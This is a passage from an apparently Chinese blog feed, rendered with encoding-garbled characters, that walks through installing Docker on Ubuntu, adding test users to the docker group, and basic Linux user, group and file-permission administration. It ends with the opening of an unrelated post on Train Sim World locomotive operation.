id="service"><ul class="nav-tabs"><li class="tab active"><a class="#service-1">x86_64 / amd64</a></li><li class="tab"><a class="#service-2">armhf</a></li><li class="tab"><a class="#service-3">arm64</a></li><li class="tab"><a class="#service-4">s390x</a></li></ul><div class="tab-content"><div class="tab-pane active" id="service-1"><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token punctuation">\</span>  <span class="token string">"deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \  <span class="token variable"><span class="token variable">$(</span>lsb_release -cs<span class="token variable">)</span></span> stable"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/docker.list <span class="token operator">></span> /dev/null</code></pre></div><div class="tab-pane" id="service-2"><pre class="language-bash" data-language="bash"><code class="language-bash">$  <span class="token builtin class-name">echo</span> <span class="token punctuation">\</span>  <span class="token string">"deb [arch=armhf signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \  <span class="token variable"><span class="token variable">$(</span>lsb_release -cs<span class="token variable">)</span></span> stable"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/docker.list <span class="token operator">></span> /dev/null</code></pre></div><div class="tab-pane" id="service-3"><pre class="language-bash" data-language="bash"><code class="language-bash">$  <span class="token builtin class-name">echo</span> <span class="token punctuation">\</span>  <span class="token string">"deb [arch=arm64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \  <span class="token variable"><span class="token variable">$(</span>lsb_release -cs<span class="token variable">)</span></span> stable"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/docker.list <span class="token operator">></span> /dev/null</code></pre></div><div class="tab-pane" id="service-4"><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token punctuation">\</span>  <span class="token string">"deb [arch=s390x signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \  <span class="token variable"><span class="token variable">$(</span>lsb_release -cs<span class="token variable">)</span></span> stable"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/docker.list <span class="token operator">></span> /dev/null</code></pre></div></div></div></li></ol><p><strong>Install Docker Engine</strong></p><ol><li><p>Update the <code>apt</code> package index, and install the <em>latest version</em> of Docker Engine and containerd, or go to the next step to install a specific version:</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> update$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> docker-ce docker-ce-cli containerd.io</code></pre><blockquote><p>Got multiple Docker repositories?</p><p>If you have multiple Docker repositories enabled, installing or updating without specifying a version in the <code>apt-get install</code> or <code>apt-get update</code> command always installs the highest possible version, which may not be appropriate for your stability needs.</p></blockquote></li></ol><p><strong>Upgrade Docker Engine</strong></p><p>To upgrade Docker Engine, first run <code>sudo apt-get update</code>, then follow the <a href="https://docs.docker.com/engine/install/ubuntu/#install-using-the-repository">installation instructions</a>, choosing the new version you want to install.</p><h3 id="æ·»åŠ æµ‹è¯•ç”¨æˆ·">æ·»åŠ æµ‹è¯•ç”¨æˆ·</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> adduser test1Adding user <span class="token variable"><span class="token variable">`</span>test1' <span class="token punctuation">..</span>.Adding new group <span class="token variable">`</span></span>test1<span class="token string">' (1001) ...Adding new user `test1'</span> <span class="token punctuation">(</span><span class="token number">1001</span><span class="token punctuation">)</span> with group <span class="token variable"><span class="token variable">`</span>test1' <span class="token punctuation">..</span>.Creating home directory <span class="token variable">`</span></span>/home/test1<span class="token string">' ...Copying files from `/etc/skel'</span> <span class="token punctuation">..</span>.New password: Retype new password: passwd: password updated successfullyChanging the user information <span class="token keyword">for</span> test1Enter the new value, or press ENTER <span class="token keyword">for</span> the defaultFull Name <span class="token punctuation">[</span><span class="token punctuation">]</span>: Room Number <span class="token punctuation">[</span><span class="token punctuation">]</span>: Work Phone <span class="token punctuation">[</span><span class="token punctuation">]</span>: Home Phone <span class="token punctuation">[</span><span class="token punctuation">]</span>: Other <span class="token punctuation">[</span><span class="token punctuation">]</span>: Is the information correct? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> y$ <span class="token function">sudo</span> adduser test2Adding user <span class="token variable"><span class="token variable">`</span>test2' <span class="token punctuation">..</span>.Adding new group <span class="token variable">`</span></span>test2<span class="token string">' (1002) ...Adding new user `test2'</span> <span class="token punctuation">(</span><span class="token number">1002</span><span class="token punctuation">)</span> with group <span class="token variable"><span class="token variable">`</span>test2' <span class="token punctuation">..</span>.Creating home directory <span class="token variable">`</span></span>/home/test2<span class="token string">' ...Copying files from `/etc/skel'</span> <span class="token punctuation">..</span>.New password: Retype new password: passwd: password updated successfullyChanging the user information <span class="token keyword">for</span> test2Enter the new value, or press ENTER <span class="token keyword">for</span> the defaultFull Name <span class="token punctuation">[</span><span class="token punctuation">]</span>: Room Number <span class="token punctuation">[</span><span class="token punctuation">]</span>: Work Phone <span class="token punctuation">[</span><span class="token punctuation">]</span>: Home Phone <span class="token punctuation">[</span><span class="token punctuation">]</span>: Other <span class="token punctuation">[</span><span class="token punctuation">]</span>: Is the information correct? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> ysiz@ubuntu:/etc/apt$ </code></pre><p><strong>æŸ¥çœ‹test1,test2 ç”¨æˆ·</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">id</span> test1<span class="token comment"># uid=1001(test1) gid=1001(test1) groups=1001(test1)</span>$ <span class="token function">id</span> test2<span class="token comment"># uid=1002(test2) gid=1002(test2) groups=1002(test2)</span><span class="token comment"># å¯ä»¥å‘ç° test1 test2 æ²¡æœ‰sudo ç­‰æƒé™,ä¸º æ™®é€šç”¨æˆ·</span></code></pre><h3 id="æˆäºˆdockeræƒé™">æˆäºˆdockeræƒé™</h3><p><strong>å°†test1,test2 æ™®é€šç”¨æˆ· æ·»åŠ åˆ°dockerç»„ä¸­</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">usermod</span> -aG docker test1$ <span class="token function">sudo</span> <span class="token function">usermod</span> -aG docker test2</code></pre><p>é‡æ–°ç™»é™†ssh æˆ–è€…<code> log out</code> åœ¨ç™»é™†å, æŸ¥çœ‹ ç”¨æˆ·æ ‡è¯†</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">id</span> test1<span class="token comment"># uid=1001(test1) gid=1001(test1) groups=1001(test1),,998(docker)</span><span class="token comment"># å¯ä»¥å‘ç°å¤šäº†dockerçš„ ç»„æ ‡è¯†</span><span class="token comment"># æ­¤æ—¶è¿è¡Œdocker info æµ‹è¯•</span>$ docker infoClient: Context:    default Debug Mode: <span class="token boolean">false</span> Plugins:  app: Docker App <span class="token punctuation">(</span>Docker Inc., v0.9.1-beta3<span class="token punctuation">)</span>  buildx: Build with BuildKit <span class="token punctuation">(</span>Docker Inc., v0.6.1-docker<span class="token punctuation">)</span>  scan: Docker Scan <span class="token punctuation">(</span>Docker Inc., v0.8.0<span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210916153753.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210916153753.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210916153752143"></p><h3 id="æ‹‰å–-docker-images">æ‹‰å– docker images</h3><p>æµ‹è¯•test1æ‹‰å»dockeré•œåƒ</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ docker pull sizaif2000/ubuntu2004v1:1.0</code></pre><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210916153828.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210916153828.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210916153827220"></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210916153921.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210916153921.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210916153920876"></p><p><strong>ubuntu:20.04  V1</strong></p><blockquote><p>ä½¿ç”¨æ¸…åæº</p><p>å·²å®‰è£…åŸºæœ¬å·¥å…·:</p><p><code>VIM - Vi IMproved 8.1 (2018 May 18, compiled Apr 15 2020 06:40:31)</code></p><p><code>cmake version 3.16.3</code></p><p><code>gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)</code></p><p><code>g++  (4:9.3.0-1ubuntu2).</code></p><p><code>wget</code>,<code>git</code>,<code>autoconf</code>,<code>automake</code>,<code>build-essential</code></p><p><code>Python 3.8.10 (default, Jun  2 2021, 10:49:15)</code></p><p><code>pip3 pip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.8)</code></p></blockquote><p><strong>ubuntu:20.04  V2</strong></p><blockquote><p>ä½¿ç”¨æ¸…åæº</p><p>å·²å®‰è£…åŸºæœ¬å·¥å…·:</p><p><code>VIM - Vi IMproved 8.1 (2018 May 18, compiled Apr 15 2020 06:40:31)</code></p><p><code>cmake version 3.16.3</code></p><p><code>gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)</code></p><p><code>g++  (4:9.3.0-1ubuntu2).</code></p><p><code>wget</code>,<code>git</code>,<code>autoconf</code>,<code>automake</code>,<code>build-essential</code></p><p><code>Python 3.8.10 (default, Jun  2 2021, 10:49:15)</code></p><p><code>pip3 pip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.8)</code></p><p>==<code>java-jdk1.8.0_291</code>==</p></blockquote></div><h2 id="å‚è€ƒçŸ¥è¯†">å‚è€ƒçŸ¥è¯†</h2><div class="story post-story"><h3 id="æ·»åŠ -ç§»é™¤-sudo-æƒé™">æ·»åŠ /ç§»é™¤ sudo æƒé™</h3><p>ç»™æŸä¸ªç”¨æˆ·æ·»åŠ  sudo æƒé™</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> adduser XXXX <span class="token function">sudo</span></code></pre><p>ç§»é™¤æŸä¸ªç”¨æˆ·sudoæƒé™</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> deluser xxxx <span class="token function">sudo</span></code></pre><blockquote><p>==æ³¨æ„!!!==  ç§»é™¤sudoæ—¶, ç®¡ç†ç”¨ä¸è¦æŠŠå”¯ä¸€çš„ç®¡ç†å‘˜çš„sudoæƒé™ç§»é™¤æ‰, å¦åˆ™éœ€è¦ root ç”¨æˆ·é‡æ–°æ·»åŠ </p></blockquote><h3 id="ubuntuç”¨æˆ·ç»„">ubuntuç”¨æˆ·ç»„</h3><h4 id="ç”¨æˆ·å’Œç”¨æˆ·æ ‡è¯†å·">ç”¨æˆ·å’Œç”¨æˆ·æ ‡è¯†å·</h4><p><strong>ç”¨æˆ·</strong></p><p>æˆ‘ä»¬ç™»å½•åˆ°Linuxç³»ç»Ÿï¼Œä½¿ç”¨çš„ç™»å½•åå’Œå¯†ç å®é™…ä¸Šå°±æ˜¯ç”¨æˆ·çš„ä¿¡æ¯æ ‡è¯†ã€‚ç”¨æˆ·æ‹¥æœ‰è´¦å·ã€ç™»å½•åã€çœŸå®å§“åã€å¯†ç ã€ä¸»ç›®å½•ã€é»˜è®¤shellç­‰å±æ€§ã€‚æ¯ä¸ªç”¨æˆ·å®é™…ä¸Šä»£è¡¨äº†ä¸€ç»„æƒé™ï¼Œè€Œè¿™äº›æƒé™åˆ†åˆ«è¡¨ç¤ºå¯ä»¥æ‰§è¡Œä¸åŒçš„æ“ä½œï¼Œæ˜¯èƒ½å¤Ÿè·å–ç³»ç»Ÿèµ„æºçš„æƒé™çš„é›†åˆã€‚</p><p><strong>ç”¨æˆ·æ ‡è¯†å·</strong></p><p>Linuxå®é™…ä¸Šå¹¶ä¸ç›´æ¥è®¤è¯†ç”¨æˆ·çš„è´¦å·ï¼Œè€Œæ˜¯æŸ¥çœ‹ç”¨æˆ·æ ‡è¯†å·ã€‚</p><p><strong>ç”¨æˆ·æ ‡è¯†å·ï¼ˆæ•´æ•°ï¼‰ï¼š</strong></p><p>0ï¼š rootï¼Œè¶…çº§ç”¨æˆ·ã€‚</p><p>1-499ï¼šç³»ç»Ÿç”¨æˆ·ï¼Œä¿è¯ç³»ç»ŸæœåŠ¡æ­£å¸¸è¿è¡Œï¼Œä¸€èˆ¬ä¸ä½¿ç”¨ã€‚</p><p>500-60000ï¼šæ™®é€šç”¨æˆ·ï¼Œå¯ç™»å½•ç³»ç»Ÿï¼Œæ‹¥æœ‰ä¸€å®šçš„æƒé™ã€‚ç®¡ç†å‘˜æ·»åŠ çš„ç”¨æˆ·åœ¨æ­¤èŒƒå›´å†…ã€‚</p><p>ç”¨æˆ·åå’Œæ ‡è¯†å·ä¸ä¸€å®šä¸€ä¸€å¯¹åº”ï¼ŒLinuxå…è®¸å‡ ä¸ªç™»å½•åå¯¹åº”åŒä¸€ä¸ªç”¨æˆ·æ ‡è¯†å·ã€‚</p><p>ç³»ç»Ÿå†…éƒ¨ç®¡ç†è¿›ç¨‹å’Œæ–‡ä»¶è®¿é—®æƒé™æ—¶ä½¿ç”¨ç”¨æˆ·æ ‡è¯†å·ã€‚</p><p>è´¦å·å’Œæ ‡è¯†å·çš„å¯¹åº”å…³ç³»åœ¨/etc/passwdæ–‡ä»¶ä¸­ã€‚</p><p><strong>/etc/passwdæ–‡ä»¶</strong></p><p>è¯¥æ–‡ä»¶æ‰€æœ‰è€…å’Œæ‰€å±ç»„ä¸ºrootï¼Œé™¤äº†rootç”¨æˆ·å¤–åªæœ‰è¯»å–çš„æƒé™ã€‚</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210914225753.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210914225753.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ ¼å¼ï¼šç™»å½•åï¼šå£ä»¤ï¼šç”¨æˆ·æ ‡è¯†å·ï¼šç»„æ ‡è¯†å·ï¼šæ³¨é‡Šï¼šç”¨æˆ·ä¸»ç›®å½•ï¼šShellç¨‹åº</p><p>ç™»å½•åï¼šåŒæ„ç³»ç»Ÿä¸­å”¯ä¸€ï¼Œå¤§å°æ•æ„Ÿã€‚</p><p>å£ä»¤ï¼šå¯†ç ï¼Œrootå’Œç”¨æˆ·å¯ä½¿ç”¨passwdå‘½ä»¤ä¿®æ”¹ã€‚<br>ç”¨æˆ·æ ‡è¯†å·ï¼šå”¯ä¸€ã€‚<br>ç»„æ ‡è¯†å·ï¼šæ¯ä¸ªç”¨æˆ·å¯ä»¥åŒæ—¶å±äºå¤šä¸ªç»„ã€‚<br>æ³¨é‡Šï¼šç›¸å…³ä¿¡æ¯ï¼ŒçœŸå®å§“åã€è”ç³»ç”µè¯ç­‰ã€‚mailå’Œfingerç­‰ä¼šä½¿ç”¨è¿™äº›ä¿¡æ¯ã€‚<br>ç”¨æˆ·ä¸»ç›®å½•ï¼šç”¨æˆ·ç™»å½•åçš„é»˜è®¤å·¥ä½œç›®å½•ã€‚rootä¸º/rootï¼Œä¸€èˆ¬ç”¨æˆ·åœ¨/homeä¸‹ã€‚<br>Shellç¨‹åºï¼šç™»å½•åé»˜è®¤å¯åŠ¨çš„Shellç¨‹åºã€‚</p><p><strong>/etc/shadowæ–‡ä»¶</strong></p><p>åŒ…å«ç”¨æˆ·çš„å¯†ç å’Œè¿‡æœŸæ—¶é—´ï¼Œåªæœ‰rootç»„å¯è¯»å†™ã€‚</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210914225924.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210914225924.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ ¼å¼ï¼šç™»å½•åï¼šåŠ å¯†å£ä»¤ï¼šæœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´ï¼šæœ€å°æ—¶é—´é—´éš”ï¼šæœ€å¤§æ—¶é—´é—´éš”ï¼šè­¦å‘Šæ—¶é—´ï¼šå¯†ç ç¦ç”¨æœŸï¼šè´¦æˆ·å¤±æ•ˆæ—¶é—´ï¼šä¿ç•™å­—æ®µ</p><p>ç™»å½•åï¼šç•¥ã€‚</p><p>åŠ å¯†å£ä»¤ï¼š*è¡¨ç¤ºè´¦æˆ·è¢«é”å®šï¼Œï¼è¡¨ç¤ºå¯†ç è¢«é”å®šã€‚å…¶ä»–çš„å‰ä¸‰ä½è¡¨ç¤ºåŠ å¯†æ–¹å¼ã€‚</p><p>æœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´ï¼šæœ€è¿‘ä¿®æ”¹å¯†ç çš„æ—¶é—´ï¼Œå¤©ä¸ºå•ä½ï¼Œ1970å¹´1æœˆ1æ—¥ç®—èµ·ã€‚</p><p>æœ€å°æ—¶é—´é—´éš”ï¼šæœ€å°ä¿®æ”¹å¯†ç çš„æ—¶é—´é—´éš”ã€‚</p><p>æœ€å¤§æ—¶é—´é—´éš”ï¼šæœ€é•¿å¯†ç æœ‰æ•ˆæœŸï¼Œåˆ°æœŸè¦æ±‚ä¿®æ”¹å¯†ç ã€‚</p><p>è­¦å‘Šæ—¶é—´ï¼šå¯†ç è¿‡æœŸåå¤šä¹…å‘å‡ºè­¦å‘Šã€‚</p><p>å¯†ç ç¦ç”¨æœŸï¼šå¯†ç è¿‡æœŸåä»ç„¶æ¥å—çš„æœ€é•¿æœŸé™ã€‚</p><p>è´¦å·å¤±æ•ˆæ—¶é—´ï¼šè´¦æˆ·çš„æœ‰æ•ˆæœŸï¼Œ1970å¹´1æœˆ1æ—¥ç®—èµ·ï¼Œç©ºä¸²è¡¨ç¤ºæ°¸ä¸è¿‡æœŸã€‚</p><p>ä¿ç•™å­—æ®µï¼šä¿ç•™å°†æ¥ä½¿ç”¨ã€‚</p><p><strong>ç”¨æˆ·ç»„å’Œç»„æ ‡è¯†å·</strong></p><p><strong>ç”¨æˆ·ç»„</strong></p><p>ç”¨æˆ·ç»„æŒ‡ï¼Œä¸€ç»„æƒé™å’ŒåŠŸèƒ½ç›¸ç±»ä¼¼çš„ç”¨æˆ·çš„é›†åˆã€‚</p><p>Linuxæœ¬èº«é¢„å®šä¹‰äº†è®¸å¤šç”¨æˆ·ç»„ï¼ŒåŒ…æ‹¬rootã€daemonã€binã€sysç­‰ï¼Œç”¨æˆ·å¯æ ¹æ®éœ€è¦è‡ªè¡Œæ·»åŠ ç”¨æˆ·ç»„ã€‚</p><p>ç”¨æˆ·ç»„æ‹¥æœ‰ç»„åã€ç»„æ ‡è¯†å·ã€ç»„æˆå‘˜ç­‰å±æ€§ã€‚</p><p><strong>ç”¨æˆ·ç»„ç¼–å·</strong></p><p>Linuxå†…éƒ¨é€šè¿‡ç»„æ ‡è¯†å·æ¥æ ‡è¯†ç”¨æˆ·ç»„ã€‚</p><p>ç”¨æˆ·ç»„ä¿¡æ¯ä¿å­˜åœ¨ /etc/group ä¸­ã€‚</p><p><strong>/etc/groupæ–‡ä»¶</strong></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210914230040.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210914230040.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ ¼å¼ï¼šç»„åï¼šå£ä»¤ï¼šç»„æ ‡è¯†ç¬¦ï¼šæˆå‘˜åˆ—è¡¨</p><p>/etc/passwdæ–‡ä»¶æŒ‡å®šçš„ç”¨æˆ·ç»„åœ¨/etc/groupä¸­ä¸å­˜åœ¨åˆ™æ— æ³•ç™»å½•ã€‚</p><p><strong>ç”¨æˆ·ç®¡ç†</strong></p><p><strong>æ·»åŠ ç”¨æˆ·</strong></p><p><strong>useraddå‘½ä»¤</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">useradd</span> <span class="token punctuation">[</span>option<span class="token punctuation">]</span> ç™»å½•å<span class="token comment"># optionå‚æ•°è‡ªè¡ŒæŸ¥é˜…ã€‚</span><span class="token comment"># ä¸€èˆ¬åŠ -måˆ›å»ºç›®å½•ã€‚</span></code></pre><p><strong>adduserå‘½ä»¤</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ adduser <span class="token punctuation">[</span>option<span class="token punctuation">]</span> user</code></pre><p>å¦‚æœæ²¡æœ‰æŒ‡å®šâ€“systemå’Œâ€“groupé€‰é¡¹ï¼Œåˆ™åˆ›å»ºæ™®é€šç”¨æˆ·ã€‚</p><p>å¦åˆ™åˆ›å»ºç³»ç»Ÿç”¨æˆ·æˆ–ç”¨æˆ·ç»„ã€‚</p><p><strong>ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼šusermod</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">usermod</span> <span class="token punctuation">[</span>option<span class="token punctuation">]</span> ç”¨æˆ·å<span class="token comment"># å…·ä½“é€‰é¡¹ä¿¡æ¯è‡ªè¡ŒæŸ¥é˜…ã€‚</span></code></pre><p><strong>åˆ é™¤ç”¨æˆ·ï¼šuserdel</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">userdel</span> <span class="token punctuation">[</span>option<span class="token punctuation">]</span> ç”¨æˆ·å<span class="token comment"># -fï¼šå¼ºåˆ¶åˆ é™¤ï¼ˆè°¨æ…ä½¿ç”¨ï¼‰</span><span class="token comment"># -rï¼šä¸»ç›®å½•ä¸­çš„æ–‡ä»¶ä¸€å¹¶åˆ é™¤ã€‚</span></code></pre><p><strong>ä¿®æ”¹ç”¨æˆ·å¯†ç ï¼špasswd</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">passwd</span> <span class="token punctuation">[</span>option<span class="token punctuation">]</span> ç™»å½•å</code></pre><p><strong>æ˜¾ç¤ºç”¨æˆ·ä¿¡æ¯</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">id</span> <span class="token punctuation">[</span>option<span class="token punctuation">]</span> <span class="token punctuation">[</span>ç”¨æˆ·<span class="token punctuation">]</span></code></pre><p><strong>ç”¨æˆ·é—´åˆ‡æ¢ï¼šsuå‘½ä»¤</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">su</span> <span class="token punctuation">[</span>option<span class="token punctuation">]</span> <span class="token punctuation">[</span>ç”¨æˆ·å<span class="token punctuation">]</span><span class="token comment"># ç”¨æˆ·åä¸º - ï¼Œåˆ™åˆ‡æ¢åˆ°rootç”¨æˆ·ã€‚</span></code></pre><p><strong>å—é™çš„ç‰¹æƒï¼šsudoå‘½ä»¤</strong></p><p>sudoä½¿å¾—ç”¨æˆ·å¯ä»¥åœ¨è‡ªå·±çš„ç¯å¢ƒä¸‹ï¼Œæ‰§è¡Œéœ€è¦rootæƒé™çš„å‘½ä»¤ã€‚</p><p>è¯¥ä¿¡æ¯ä¿å­˜åœ¨/etc/sudoersä¸­ã€‚</p><h3 id="ç”¨æˆ·ç»„ç®¡ç†">ç”¨æˆ·ç»„ç®¡ç†</h3><p><strong>æ·»åŠ ç”¨æˆ·ç»„</strong><br><strong>addgroupå‘½ä»¤</strong><br>ç±»ä¼¼adduser</p><p><strong>groupadd</strong><br>ç±»ä¼¼useradd</p><p><strong>ä¿®æ”¹ç”¨æˆ·ç»„</strong><br>ç±»ä¼¼usermodï¼Œä½¿ç”¨groupmodã€‚</p><p><strong>åˆ é™¤ç”¨æˆ·ç»„</strong><br>ç±»ä¼¼userdelï¼Œä½¿ç”¨groupdelã€‚</p><h3 id="æƒé™ç®¡ç†">æƒé™ç®¡ç†</h3><p><strong>æƒé™ç»„</strong><br>ä¸€èˆ¬åˆ›å»ºæ–‡ä»¶çš„äººä¸ºæ‰€æœ‰è€…ï¼Œå…¶æ‰€å±çš„ä¸»ç»„ä¸ºæ‰€å±ç»„ï¼Œå…¶ä»–ç”¨æˆ·ä¸ºå…¶ä»–ç»„ã€‚</p><p><strong>åŸºæœ¬æƒé™ç±»å‹</strong></p><p>ä¸‰ç§ï¼šè¯»ã€å†™ã€æ‰§è¡Œã€‚</p><p>æƒé™åŠå…¶è¡¨ç¤ºå€¼ï¼š</p><p>è¯»ï¼šræˆ–4</p><p>å†™ï¼šwæˆ–2</p><p>æ‰§è¡Œï¼šxæˆ–1</p><p><strong>ç‰¹æ®Šæƒé™</strong><br>setuidã€setgidå’Œé»æ»ä½ã€‚</p><p>setuidå’Œsetgidèƒ½ä»¥æ–‡ä»¶æ‰€æœ‰è€…æˆ–æ‰€å±ç»„çš„èº«ä»½è¿è¡Œã€‚</p><p>é»æ»ä½ä½¿å¾—åªæœ‰æ–‡ä»¶çš„æ‰€æœ‰è€…æ‰å¯ä»¥é‡å‘½åå’Œåˆ é™¤æ–‡ä»¶ã€‚</p><p><strong>è®¿é—®æ§åˆ¶åˆ—è¡¨</strong><br>è®¿é—®æ§åˆ¶è¡¨ACLå¯ä»¥é’ˆå¯¹æŸä¸ªç”¨æˆ·æˆ–è€…ç”¨æˆ·ç»„å•ç‹¬è®¾ç½®è®¿é—®æƒé™ã€‚</p><p><strong>æ”¹å˜æ–‡ä»¶æ‰€æœ‰è€…chownå‘½ä»¤</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">chown</span> <span class="token punctuation">[</span>option<span class="token punctuation">]</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>owner<span class="token punctuation">]</span><span class="token punctuation">[</span>:<span class="token punctuation">[</span>group<span class="token punctuation">]</span><span class="token punctuation">]</span> file<span class="token punctuation">..</span>.</code></pre><p><strong>æ”¹å˜æ–‡ä»¶æ‰€å±ç»„chgrpå‘½ä»¤</strong></p><p>ç”¨æˆ·ä¸å—æ–‡ä»¶çš„æ–‡ä»¶ä¸»æˆ–è¶…çº§ç”¨æˆ·ä¸èƒ½ä¿®æ”¹ç»„ã€‚</p><p><strong>è®¾ç½®æƒé™æ©ç umaskå‘½ä»¤</strong></p><p>æ–‡ä»¶çš„æƒé™ä¸º666-æ©ç </p><p>ç›®å½•çš„æƒé™ä¸º777-æ©ç </p><p><strong>ä¿®æ”¹æ–‡ä»¶è®¿é—®æƒé™</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">chmod</span> <span class="token punctuation">[</span>option<span class="token punctuation">]</span><span class="token punctuation">..</span>.mode<span class="token punctuation">[</span>,mode<span class="token punctuation">]</span><span class="token punctuation">..</span>.file<span class="token punctuation">..</span>.</code></pre><p>â€œ+â€ï¼šå¢åŠ æƒé™</p><p>â€œ-â€ï¼šå‡å°‘æƒé™</p><p>â€œ=â€ï¼šè®¾ç½®æƒé™</p><p><strong>ä¿®æ”¹æ–‡ä»¶ACLï¼šsetfaclå‘½ä»¤</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ setfacl <span class="token punctuation">[</span>option<span class="token punctuation">]</span> file<span class="token punctuation">..</span>.</code></pre><p><strong>æŸ¥è¯¢æ–‡ä»¶çš„ACL</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ getfacl <span class="token punctuation">[</span>æ–‡ä»¶å<span class="token punctuation">]</span></code></pre></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TSW-2 åˆ—è½¦æ“ä½œæ‰‹å†Œåˆé›†</title>
      <link href="/posts/238e4ec1/"/>
      <url>/posts/238e4ec1/</url>
      
        <content type="html"><![CDATA[<h2 id="F40PH-3Cå‹å·æ“ä½œæ‰‹å†Œ">F40PH-3Cå‹å·æ“ä½œæ‰‹å†Œ</h2><div class="story post-story"><p>the F40PH-3C is a locomotive used on the <a href="https://train-sim-world.fandom.com/wiki/MBTA_Commuter_Rail">MBTA Commuter Rail</a>. It is featured in <a href="https://train-sim-world.fandom.com/wiki/Boston_Sprinter">Boston Sprinter</a>.</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210829121101.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210829121101.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210829113012169"></p><h3 id="å¿«é€Ÿå¯åŠ¨">å¿«é€Ÿå¯åŠ¨</h3><ol><li>ä¸»ç”µæ± <code>æ‰“å¼€</code></li><li>æ— çº¿ç”µä¿é™©ä¸<code>æ‰“å¼€</code></li><li>æŒ‰ä½å¼•æ“å¯åŠ¨å¼€å…³4s</li><li>æŒ‰ä½åˆ—è½¦ä¾›ç”µå¼•æ“å¯åŠ¨4s</li><li>äº¤æµç”µæŒ‰é’® 